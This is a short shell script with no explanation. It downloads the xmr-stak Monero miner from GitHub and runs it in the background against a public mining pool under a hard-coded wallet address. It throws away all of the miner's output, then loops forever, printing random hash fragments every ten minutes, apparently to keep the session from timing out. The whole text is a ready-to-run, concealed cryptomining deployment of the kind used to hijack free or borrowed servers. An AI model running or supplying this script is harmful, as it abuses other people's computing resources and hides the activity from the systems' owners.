apt update
wget https://github.com/fireice-uk/xmr-stak/releases/download/2.10.8/xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz
tar -xvf xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz && cd xmr-stak-linux-2.10.8-cpu_cuda-nvidia
./xmr-stak --tls-url pool.hashvault.pro:443 --user 83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg --pass $(echo $(shuf -i 1-20000 -n 1)-uing) --currency cryptonight_cpu > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
